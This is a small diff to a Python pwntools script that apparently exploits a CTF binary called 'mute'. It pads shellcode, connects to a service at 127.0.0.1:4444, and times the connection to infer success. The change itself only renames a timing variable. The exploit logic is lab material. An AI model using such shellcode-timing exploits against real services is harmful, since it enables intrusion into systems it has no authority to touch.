@@ -36,7 +36,6 @@ jne .loop
     sc += "\x00"*(0x1000 - len(sc))
 
     starttime = time.time()
-    endtime = None
 #    proc = process('./mute')
     proc = remote('127.0.0.1', 4444)
     proc.recvline()
@@ -48,8 +47,8 @@ jne .loop
         pass
     finally:
         proc.close()
-        endtime = time.time() - starttime
-        if(endtime >= 1):
+        ellapsed = time.time() - starttime
+        if(ellapsed >= 1):
             return True
         else:
             return False
